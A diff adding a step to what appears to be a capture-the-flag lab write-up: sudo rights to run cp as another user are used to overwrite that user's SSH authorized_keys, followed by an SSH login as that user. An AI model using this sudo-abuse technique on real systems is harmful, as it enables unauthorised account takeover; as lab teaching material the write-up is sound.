@@ -76,6 +76,16 @@ Desktop/  Documents/  Downloads/  Music/  Pictures/  Public/  Videos/  prog/
 ```
 And then we are not using rbash anymore.
 
+Using sudo -l, we see that we can use /bin/cp as trinity. 
+
+```
+sudo -u trinity /bin/cp toto.txt /home/trinity/.ssh/authorized_keys
+❯❯ ssh trinity@172.20.10.12 -i /root/.ssh/id_rsa
+Last login: Mon Aug  6 16:37:45 2018 from 192.168.56.102
+trinity@porteus:~$
+```
+
+
 
 
 
